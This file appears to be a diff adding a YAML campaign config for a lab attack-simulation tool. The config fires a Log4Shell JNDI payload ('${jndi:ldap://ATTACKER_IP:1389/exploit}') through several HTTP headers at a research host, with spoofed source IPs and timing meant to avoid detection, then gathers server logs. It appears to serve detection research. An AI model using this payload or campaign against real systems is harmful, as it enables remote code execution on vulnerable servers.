@@ -1,0 +1,58 @@
+campaign:
+  name: "Log4Shell Only"
+  description: >
+    Single-phase Log4Shell (CVE-2021-44228) campaign against Isildur.
+    Sends JNDI injection payloads via HTTP headers to the vulnerable
+    Log4j application on port 8080. Uses decelerating timing to simulate
+    an attacker spraying then slowing down to avoid detection.
+  seed: 42
+
+  target:
+    host: 192.168.2.201
+    ssh_user: researcher
+    ssh_key: ~/.ssh/isildur_research
+    ssh_port: 22
+
+  phases:
+    - name: "Log4Shell Exploitation"
+      module: log4shell
+      mitre_technique: "T1190"
+      mitre_tactic: "TA0001"
+      attack_type: web_exploit
+      attack_stage: initial_access
+      severity: 3
+      params:
+        target_port: 8080
+        path: /
+        jndi_string: "${jndi:ldap://ATTACKER_IP:1389/exploit}"
+        injection_headers: ["X-Api-Version", "User-Agent", "Referer",
+                            "X-Forwarded-For", "Accept-Language"]
+        num_requests: 150
+      ip_source:
+        strategy: aliased
+        count: 5
+        subnet: "192.168.2.0/24"
+        start_offset: 110
+        interface: en0
+      timing:
+        duration_seconds: 300
+        profile: decelerating
+        delay_after_seconds: 0
+
+  collection:
+    log_sources:
+      - name: web_access
+        parser: web_access
+        remote_path: /var/log/nginx/access.log
+      - name: web_error
+        parser: web_error
+        remote_path: /var/log/nginx/error.log
+      - name: syslog
+        parser: syslog
+        remote_path: /var/log/syslog
+      - name: auditd
+        parser: auditd
+        remote_command: "sudo ausearch -k research_exploit --raw"
+    output:
+      db_path: data/campaigns.db
+      time_buffer_seconds: 60
